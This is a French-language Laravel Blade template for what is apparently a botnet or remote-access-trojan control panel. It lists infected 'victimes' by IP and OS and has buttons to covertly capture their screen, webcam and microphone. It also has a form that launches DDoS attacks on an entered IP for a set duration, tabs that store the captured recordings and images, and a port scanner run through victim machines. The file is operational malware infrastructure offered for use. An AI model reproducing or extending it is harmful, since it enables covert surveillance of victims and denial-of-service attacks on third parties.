@extends("layouts.layout")

@section("title", "Accueil")

@section("content")
<section class="section">
    <div class="card mb-3">
        <div class="row g-0">
            <div class="col-md-4">
                <img src="{{ asset('images/' . $group->image) }}" class="img-fluid rounded-start" alt="{{ $group->name }}">
            </div>
            <div class="col-md-8">
                <div class="card-body">
                    <h1 class="card-title">{{ strtoupper($group->name) }}</h1>
                    <!-- Bordered Tabs Justified -->
                    <ul class="nav nav-tabs nav-tabs-bordered d-flex" id="borderedTabJustified" role="tablist">
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100 active" id="home-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-home" type="button" role="tab" aria-controls="home" aria-selected="true">Victimes</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="profile-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-profile" type="button" role="tab" aria-controls="profile" aria-selected="false">DDOS</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="record-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-record" type="button" role="tab" aria-controls="record" aria-selected="false">Enregistrements</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="picture-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-picture" type="button" role="tab" aria-controls="picture" aria-selected="false">Photos</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="screen-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-screen" type="button" role="tab" aria-controls="screen" aria-selected="false">Captures</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="scan-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-scan" type="button" role="tab" aria-controls="scan" aria-selected="false">Scan</button>
                        </li>
                        <li class="nav-item flex-fill" role="presentation">
                            <button class="nav-link w-100" id="contact-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-contact" type="button" role="tab" aria-controls="contact" aria-selected="false">Informations</button>
                        </li>
                    </ul>
                    @if(session('output'))
                        <div class="alert alert-info">{{ session('output') }}</div>
                    @endif
                    <div class="tab-content pt-2" id="borderedTabJustifiedContent">
                        <div class="tab-pane fade show active" id="bordered-justified-home" role="tabpanel" aria-labelledby="home-tab">
                            <table class="table">
                                <tbody>
                                    @foreach ($victims as $victim)
                                    <tr>
                                        <th scope="row">
                                            @if ($victim->os == "windows")
                                            <i class="bx bxl-windows"></i>
                                            @elseif ($victim->os == "linux")
                                            <i class="bx bxl-tux"></i>
                                            @elseif ($victim->os == "macos")
                                            <i class="bx bxl-apple"></i>
                                            @endif
                                        </th>
                                        <td>
                                            @if ($victim->status == "1")
                                            <div class="spinner-grow spinner-grow-sm text-success" role="status">
                                                <span class="visually-hidden">Loading...</span>
                                            </div>
                                            @else
                                            <div class="spinner-grow spinner-grow-sm text-danger" role="status">
                                                <span class="visually-hidden">Loading...</span>
                                            </div>
                                            @endif
                                        </td>
                                        <td>{{ $victim->ip }}</td>
                                        <td>{{ $victim->uid }}</td>
                                        <form method="POST" action="{{ route('network.scan') }}">
                                            @csrf
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
                                            <td><button type="submit" class="btn btn-warning"><i class="bi bi-broadcast"></i></button></td>
                                        </form>
                                        <form method="POST" action="{{ route('network.screenshot') }}">
                                            @csrf
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
                                            <td><button type="submit" class="btn btn-warning"><i class="bi bi-fullscreen"></i></button></td>
                                        </form>
                                        <form method="POST" action="{{ route('network.picture') }}">
                                            @csrf
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
                                            <td><button type="submit" class="btn btn-warning"><i class="bi bi-camera-fill"></i></button></td>
                                        </form>
                                        <form method="POST" action="{{ route('network.record') }}">
                                            @csrf
                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
                                            <td><button type="submit" class="btn btn-warning"><i class="bi bi-mic-fill"></i></button></td>
                                        </form>
                                        <td><a class="btn btn-primary">Connexion</a></td>
                                    </tr>
                                    @endforeach
                                </tbody>
                            </table>
                        </div>
                        <div class="tab-pane fade" id="bordered-justified-profile" role="tabpanel" aria-labelledby="profile-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">DDOS</h5>
                                    <form method="POST" action="{{ route('network.ddos') }}">
                                        @csrf  <!-- N'oubliez pas le jeton CSRF pour la sécurité -->
                                        <div class="row mb-3">
                                            <label class="col-sm-2 col-form-label">ID Groupe</label>
                                            <div class="col-sm-10">
                                                <input type="text" class="form-control" name="group_id" value="{{ $group->id }}" readonly>
                                            </div>
                                        </div>
                                        <div class="row mb-3">
                                            <label class="col-sm-2 col-form-label">Nom groupe</label>
                                            <div class="col-sm-10">
                                                <input type="text" class="form-control" name="group_name" value="{{ $group->name }}" readonly>
                                            </div>
                                        </div>
                                        <div class="mb-3 row">
                                            <label class="col-sm-2 col-form-label">Adresse IP</label>
                                            <div class="col-sm-10">
                                                <input type="text" class="form-control" name="ip_address">
                                            </div>
                                        </div>
                                        <div class="mb-3 row">
                                            <label class="col-sm-2 col-form-label">Temps (en secondes)</label>
                                            <div class="col-sm-10">
                                                <input type="number" class="form-control" name="duration">
                                            </div>
                                        </div>
                                        <button type="submit" class="btn btn-success">Démarrer le DDOS</button>
                                    </form>
                                    <div class="credits">
                                        <br>
                                        Vous êtes responsable des conséquences que cet outil peut avoir sur les victimes.
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="bordered-justified-record" role="tabpanel" aria-labelledby="record-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Enregistrements</h5>
                                    <table class="table">
                                        <thead>
                                            <tr>
                                                <th scope="col">ID</th>
                                                <th scope="col">Nom</th>
                                                <th scope="col">Heure</th>
                                                <th scope="col">Date</th>
                                                <th scope="col">Actions</th>
                                            </tr>
                                            </thead>
                                            <tbody>
                                            <tr>
                                                <th scope="row">1</th>
                                                <td scope="row">20240625-134556.wav</td>
                                                <td scope="row">13h45</td>
                                                <td scope="row">25/06/2024</td>
                                                <td>
                                                    <button type="submit" class="btn btn-success">Télécharger</button>
                                                    <button type="submit" class="btn btn-danger">Supprimer</button>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="bordered-justified-picture" role="tabpanel" aria-labelledby="picture-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Photos</h5>
                                    <table class="table">
                                        <thead>
                                            <tr>
                                                <th scope="col">ID</th>
                                                <th scope="col">Nom</th>
                                                <th scope="col">Heure</th>
                                                <th scope="col">Date</th>
                                                <th scope="col">Actions</th>
                                            </tr>
                                            </thead>
                                            <tbody>
                                            <tr>
                                                <th scope="row">1</th>
                                                <td scope="row">20240625-134556.jpg</td>
                                                <td scope="row">13h45</td>
                                                <td scope="row">25/06/2024</td>
                                                <td>
                                                    <button type="submit" class="btn btn-success">Télécharger</button>
                                                    <button type="submit" class="btn btn-danger">Supprimer</button>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="bordered-justified-screen" role="tabpanel" aria-labelledby="screen-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Captures</h5>
                                    <table class="table">
                                        <thead>
                                            <tr>
                                                <th scope="col">ID</th>
                                                <th scope="col">Nom</th>
                                                <th scope="col">Heure</th>
                                                <th scope="col">Date</th>
                                                <th scope="col">Actions</th>
                                            </tr>
                                            </thead>
                                            <tbody>
                                            <tr>
                                                <th scope="row">1</th>
                                                <td scope="row">20240625-134556.png</td>
                                                <td scope="row">13h45</td>
                                                <td scope="row">25/06/2024</td>
                                                <td>
                                                    <button type="submit" class="btn btn-success">Télécharger</button>
                                                    <button type="submit" class="btn btn-danger">Supprimer</button>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>

                        <div class="tab-pane fade" id="bordered-justified-scan" role="tabpanel" aria-labelledby="scan-tab">
                            <div class="card">
                                <div class="card-body">
                                    <h5 class="card-title">Scan</h5>
                                    <form method="POST" action="{{ route('network.scanport') }}" class="row g-3">
                                        @csrf
                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
                                            <div class="col-md-3">
                                                <select class="form-select" name="victim_uid" id="validationDefault04" required>
                                                    @foreach ($victims as $victim)
                                                        <option value="{{ $victim->uid }}">{{ $victim->uid }}</option>
                                                    @endforeach
                                                </select>
                                            </div>
                                            <div class="col-md-2">
                                                <input type="text" class="form-control" placeholder="ip" name="ip">
                                            </div>
                                            <div class="col-md-2">
                                                <input type="number" class="form-control" name="port1" required min="1" max="65535" placeholder="port 1">
                                            </div>
                                            <div class="col-md-2">
                                                <input type="number" class="form-control" name="port2" min="1" max="65535" placeholder="port 2">
                                            </div>
                                            <div class="col-md-1">
                                                <button type="submit" class="btn btn-warning"><i class="bi bi-broadcast"></i></button>
                                            </div>
                                    </form>
                                    <div class="tab-content pt-2" id="borderedTabJustifiedContent">
                                        <div class="tab-pane fade show active" id="bordered-justified-home" role="tabpanel" aria-labelledby="home-tab">
                                            @if (!empty($scan) && !empty($scan->result))
                                                <ul class="list-group">
                                                    @foreach (explode(' / ', $scan->result) as $item)
                                                        @if (!empty($item))
                                                            <li class="list-group-item">{{ $item }}</li>
                                                        @endif
                                                    @endforeach
                                                </ul>
                                            @endif
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="tab-pane fade" id="bordered-justified-contact" role="tabpanel" aria-labelledby="contact-tab">
                            <p>Créé le {{ $group->created_at }}</p>
                            <p><small class="text-muted">Dernière mise à jour le {{ $group->updated_at }}</small></p>
                            <form action="{{ route('network.destroy', $group->id) }}" method="POST">
                                @csrf
                                <button class="btn btn-danger" type="submit">Supprimer</button>
                            </form>
                        </div>
                    </div><!-- End Bordered Tabs Justified -->
                </div>
            </div>
        </div>
    </div>
</section>
@endsection
